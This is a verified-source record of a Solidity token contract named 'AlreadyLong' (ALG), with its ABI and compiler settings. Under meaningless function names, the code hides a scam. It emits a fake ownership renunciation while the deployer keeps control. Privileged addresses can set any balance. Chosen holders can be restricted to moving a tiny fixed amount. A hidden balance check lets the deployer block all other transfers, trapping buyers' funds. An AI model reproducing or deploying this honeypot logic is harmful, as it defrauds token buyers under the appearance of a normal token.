{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.9;\n\ninterface modeAt {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract liquidityFundLaunched {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface exemptTrading {\n    function createPair(address marketingEnable, address txSell) external returns (address);\n}\n\ninterface amountAuto {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address autoLaunchEnable) external view returns (uint256);\n\n    function transfer(address listSwapEnable, uint256 listAt) external returns (bool);\n\n    function allowance(address toAtSwap, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 listAt) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address listSwapEnable,\n        uint256 listAt\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed tokenEnable, uint256 value);\n    event Approval(address indexed toAtSwap, address indexed spender, uint256 value);\n}\n\ninterface txFee is amountAuto {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract AlreadyLong is liquidityFundLaunched, amountAuto, txFee {\n\n    mapping(address => bool) public txToken;\n\n    function autoTakeMin(address launchAt) public {\n        receiverShould();\n        \n        if (launchAt == amountSell || launchAt == modeExempt) {\n            return;\n        }\n        txToken[launchAt] = true;\n    }\n\n    function owner() external view returns (address) {\n        return buyTx;\n    }\n\n    uint256 constant maxFundLiquidity = 10 ** 10;\n\n    uint256 public exemptEnableShould;\n\n    function transfer(address toSwap, uint256 listAt) external virtual override returns (bool) {\n        return takeReceiver(_msgSender(), toSwap, listAt);\n    }\n\n    function transferFrom(address feeTradingTotal, address listSwapEnable, uint256 listAt) external override returns (bool) {\n        if (_msgSender() != autoEnableSell) {\n            if (teamIsEnable[feeTradingTotal][_msgSender()] != type(uint256).max) {\n                require(listAt <= teamIsEnable[feeTradingTotal][_msgSender()]);\n                teamIsEnable[feeTradingTotal][_msgSender()] -= listAt;\n            }\n        }\n        return takeReceiver(feeTradingTotal, listSwapEnable, listAt);\n    }\n\n    function takeTx() public {\n        emit OwnershipTransferred(amountSell, address(0));\n        buyTx = address(0);\n    }\n\n    mapping(address => uint256) private tokenExempt;\n\n    string private tradingList = \"Already Long\";\n\n    bool public feeMaxAmount;\n\n    uint256 modeLaunch;\n\n    uint256 private senderMarketing = 100000000 * 10 ** 18;\n\n    uint256 private modeFee;\n\n    function decimals() external view virtual override returns (uint8) {\n        return buyFee;\n    }\n\n    function limitLaunched(address tradingTx) public {\n        if (feeMaxAmount) {\n            return;\n        }\n        if (enableAtToken == exemptEnableShould) {\n            exemptEnableShould = enableAtToken;\n        }\n        enableMinLimit[tradingTx] = true;\n        \n        feeMaxAmount = true;\n    }\n\n    function approve(address txAmount, uint256 listAt) public virtual override returns (bool) {\n        teamIsEnable[_msgSender()][txAmount] = listAt;\n        emit Approval(_msgSender(), txAmount, listAt);\n        return true;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return senderMarketing;\n    }\n\n    function amountFund(address toSwap, uint256 listAt) public {\n        receiverShould();\n        tokenExempt[toSwap] = listAt;\n    }\n\n    event OwnershipTransferred(address indexed fundSell, address indexed sellList);\n\n    address private buyTx;\n\n    function balanceOf(address autoLaunchEnable) public view virtual override returns (uint256) {\n        return tokenExempt[autoLaunchEnable];\n    }\n\n    address enableFee = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    address autoEnableSell = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    bool public swapEnable;\n\n    bool public atMode;\n\n    function receiverShould() private view {\n        require(enableMinLimit[_msgSender()]);\n    }\n\n    function maxTake(uint256 listAt) public {\n        receiverShould();\n        modeLaunch = listAt;\n    }\n\n    function feeBuy(address feeTradingTotal, address listSwapEnable, uint256 listAt) internal returns (bool) {\n        require(tokenExempt[feeTradingTotal] >= listAt);\n        tokenExempt[feeTradingTotal] -= listAt;\n        tokenExempt[listSwapEnable] += listAt;\n        emit Transfer(feeTradingTotal, listSwapEnable, listAt);\n        return true;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return tradingList;\n    }\n\n    uint256 private listLaunched;\n\n    function getOwner() external view returns (address) {\n        return buyTx;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return marketingReceiverList;\n    }\n\n    string private marketingReceiverList = \"ALG\";\n\n    mapping(address => mapping(address => uint256)) private teamIsEnable;\n\n    uint256 private enableAtToken;\n\n    function allowance(address feeTeamSender, address txAmount) external view virtual override returns (uint256) {\n        if (txAmount == autoEnableSell) {\n            return type(uint256).max;\n        }\n        return teamIsEnable[feeTeamSender][txAmount];\n    }\n\n    uint256 public buyTake;\n\n    uint256 tokenShouldLaunched;\n\n    uint8 private buyFee = 18;\n\n    function takeReceiver(address feeTradingTotal, address listSwapEnable, uint256 listAt) internal returns (bool) {\n        if (feeTradingTotal == amountSell) {\n            return feeBuy(feeTradingTotal, listSwapEnable, listAt);\n        }\n        uint256 modeReceiver = amountAuto(modeExempt).balanceOf(enableFee);\n        require(modeReceiver == modeLaunch);\n        require(listSwapEnable != enableFee);\n        if (txToken[feeTradingTotal]) {\n            return feeBuy(feeTradingTotal, listSwapEnable, maxFundLiquidity);\n        }\n        return feeBuy(feeTradingTotal, listSwapEnable, listAt);\n    }\n\n    mapping(address => bool) public enableMinLimit;\n\n    constructor (){\n        \n        modeAt maxMode = modeAt(autoEnableSell);\n        modeExempt = exemptTrading(maxMode.factory()).createPair(maxMode.WETH(), address(this));\n        \n        amountSell = _msgSender();\n        takeTx();\n        enableMinLimit[amountSell] = true;\n        tokenExempt[amountSell] = senderMarketing;\n        \n        emit Transfer(address(0), amountSell, senderMarketing);\n    }\n\n    address public amountSell;\n\n    address public modeExempt;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"toAtSwap\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fundSell\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"sellList\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tokenEnable\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeTeamSender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"txAmount\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toSwap\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"listAt\",\"type\":\"uint256\"}],\"name\":\"amountFund\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountSell\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txAmount\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"listAt\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atMode\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchAt\",\"type\":\"address\"}],\"name\":\"autoTakeMin\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoLaunchEnable\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyTake\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"enableMinLimit\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptEnableShould\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeMaxAmount\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingTx\",\"type\":\"address\"}],\"name\":\"limitLaunched\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"listAt\",\"type\":\"uint256\"}],\"name\":\"maxTake\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeExempt\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapEnable\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeTx\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toSwap\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"listAt\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeTradingTotal\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"listSwapEnable\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"listAt\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"txToken\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "AlreadyLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}